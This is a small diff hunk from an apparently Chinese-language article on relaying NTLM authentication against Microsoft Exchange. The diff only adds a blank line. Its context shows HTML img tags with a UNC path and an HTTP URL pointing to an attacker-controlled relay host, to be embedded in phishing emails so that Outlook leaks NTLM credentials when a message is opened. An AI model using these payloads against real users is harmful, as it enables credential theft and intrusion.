@@ -329,6 +329,7 @@ Exchange 的认证也支持 NTLM SSP。我们可以 relay 的 Exchange，从而�
 <img src="\\192.168.60.172\blank">
 <img src="http://relayubuntu/blank">
 ```
+
 在用户通过 Outlook 打开邮件时：
 
 1. UNC 默认会通过 smb 协议发起 NTLM 认证，但是外网钓鱼的话，目标单位的 smb 流量可能无法出网。
